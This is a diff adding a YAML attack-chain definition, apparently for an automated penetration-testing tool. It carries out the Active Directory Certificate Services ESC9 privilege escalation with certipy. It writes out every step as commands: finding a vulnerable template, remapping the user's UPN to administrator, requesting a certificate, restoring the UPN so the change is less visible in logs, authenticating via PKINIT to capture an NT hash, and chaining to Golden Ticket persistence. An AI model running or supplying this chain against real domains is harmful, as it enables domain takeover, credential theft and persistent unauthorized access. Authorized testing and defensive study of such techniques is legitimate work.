@@ -1,0 +1,108 @@
+id: esc9-adcs-no-security-extension
+name: "ADCS ESC9 — no szOID_NTDS_CA_SECURITY_EXT (UPN remap)"
+description: >
+  Post-May-2022 patches added a Security Extension to certs that binds
+  the cert to the requester's SID. When a template has
+  `CT_FLAG_NO_SECURITY_EXTENSION` set (ESC9), this binding is missing —
+  rename your account's UPN to Administrator, request a cert via that
+  template, then PKINIT authenticates you as Administrator.
+tags: [adcs, esc9, priv-esc, certificates, cve-2022-26931, cve-2022-26923]
+difficulty: hard
+
+inputs:
+  - name: dc_ip
+    source: target_context.ip
+    required: true
+  - name: domain
+    source: target_context.domain
+    required: true
+  - name: user
+    description: "Your principal (must have write rights on its own UPN — usually GenericWrite on itself or msDS-KeyCredentialLink)."
+    source: target_context.user
+    required: true
+  - name: password
+    source: target_context.password
+    required: true
+
+steps:
+  - id: find_esc9
+    name: "Find ESC9 template"
+    command_ref: certipy-find
+    inputs:
+      ip: "${dc_ip}"
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+    capture:
+      - var: vuln_template
+        regex: 'Template Name\s*:\s*(\S+)\s*\n[\s\S]*?Vulnerabilities[\s\S]*?ESC9'
+        match: first
+      - var: ca_name
+        regex: 'CA Name\s*:\s*(.+?)$'
+        match: first
+
+  - id: rename_upn
+    name: "Set your account's UPN to administrator (write attribute)"
+    inline_command: |
+      certipy account -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> \
+        -upn 'administrator' -user '<user>'
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+    notes: |
+      You need write rights on your own userPrincipalName. If you don't,
+      use shadow-credentials chain on yourself first, then add the agent
+      KeyCredential to enable PKINIT-as-self.
+
+  - id: request_cert
+    name: "Request cert through the ESC9 template"
+    command_ref: certipy-esc9
+    requires: [vuln_template, ca_name]
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+      ca_name: "${ca_name}"
+      vulnerable_template: "${vuln_template}"
+    capture:
+      - var: pfx_file
+        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
+        match: first
+
+  - id: restore_upn
+    name: "Restore your real UPN"
+    inline_command: |
+      certipy account -u 'administrator@<domain>' -p '<password>' -dc-ip <dc-ip> \
+        -upn '<original_upn>' -user '<user>'
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+    notes: |
+      Restore your principal's original UPN — leaving it as
+      'administrator' breaks the real admin's login and screams in logs.
+
+  - id: pkinit_auth
+    name: "Authenticate via PKINIT — server checks UPN at cert-issue time"
+    command_ref: certipy-auth
+    requires: [pfx_file]
+    inputs:
+      pfx_file: "${pfx_file}"
+      ip: "${dc_ip}"
+    capture:
+      - var: dc_nt_hash
+        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
+        match: first
+
+references:
+  - title: "Certipy 4 — ESC9/ESC10 deep-dive"
+    url:   "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"
+
+next_chains:
+  - chain: ad-persistence-golden-ticket
+    when:   'dc_nt_hash captured'
+    reason: 'Persist via Golden Ticket.'
